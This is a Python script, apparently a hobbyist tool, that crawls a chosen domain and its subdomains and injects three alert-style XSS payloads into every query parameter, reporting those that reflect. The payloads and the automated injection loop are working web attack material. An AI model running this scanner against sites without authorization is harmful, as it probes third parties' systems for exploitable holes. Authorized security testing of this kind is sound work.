import requests
from urllib.parse import urljoin, urlparse, urlencode, parse_qsl
from bs4 import BeautifulSoup
import tldextract

# 🎯 XSS Payloads for testing
payloads = [
    "<script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>"
]

# 🔁 Visited URLs to avoid duplicates
visited_urls = set()
output_results = []

def is_subdomain(url, domain):
    """
    🕵️‍♂️ Check if a URL belongs to the same domain or its subdomains.
    """
    extracted_main = tldextract.extract(domain)
    extracted_url = tldextract.extract(url)
    return extracted_url.domain == extracted_main.domain and extracted_url.suffix == extracted_main.suffix

def find_urls(url, domain):
    """
    🌐 Crawl a given URL and return a list of internal links.
    """
    urls = []
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')

        for link in soup.find_all('a', href=True):
            full_url = urljoin(url, link['href'])
            if is_subdomain(full_url, domain) and full_url not in visited_urls:
                visited_urls.add(full_url)
                urls.append(full_url)
    except Exception as e:
        print(f"❌ Error crawling {url}: {e}")
    return urls

def test_xss(url):
    """
    🧪 Test XSS payloads on all parameters of a URL.
    """
    try:
        parsed_url = urlparse(url)
        params = dict(parse_qsl(parsed_url.query))

        for param in params:
            for payload in payloads:
                # 🚀 Inject payload into the parameter
                test_params = params.copy()
                test_params[param] = payload
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(test_params)}"

                print(f"🔍 Testing: {test_url}")
                response = requests.get(test_url, timeout=5)

                # 🔎 Check if payload reflects in the response
                if payload in response.text:
                    result = f"✅ [VULNERABLE] Parameter '{param}' is vulnerable to XSS on {test_url}"
                    print(result)
                    output_results.append(result)
                    return True
        result = f"🛡️ [SAFE] No vulnerabilities found for {url}"
        print(result)
        output_results.append(result)
    except Exception as e:
        error_message = f"❌ Error testing {url}: {e}"
        print(error_message)
        output_results.append(error_message)
    return False

def crawl_and_test(domain, output_file):
    """
    🔍 Crawl a domain and its subdomains to find potential XSS vulnerabilities.
    """
    print(f"🚀 Starting crawl on domain: {domain}")
    urls_to_test = [domain]
    for url in urls_to_test:
        urls = find_urls(url, domain)
        urls_to_test.extend(urls)
        for found_url in urls:
            test_xss(found_url)
    
    # Save results to the output file
    with open(output_file, 'w') as f:
        f.write("\n".join(output_results))
    print(f"\n📁 Results saved to: {output_file}")

if __name__ == "__main__":
    print("🌟 Welcome to XSS Parameter Finder 🌟")
    print("🔑 Example Input: https://example.com")
    print("⚠️ Disclaimer: Use this tool only for educational purposes and authorized testing!")
    
    target_domain = input("🔗 Enter the target domain (e.g., https://example.com): ")
    output_file = input("📂 Enter the name of the output file (e.g., results.txt): ")
    
    if target_domain and output_file:
        crawl_and_test(target_domain, output_file)
    else:
        print("❌ Error: Please provide both a valid domain and output file name.")
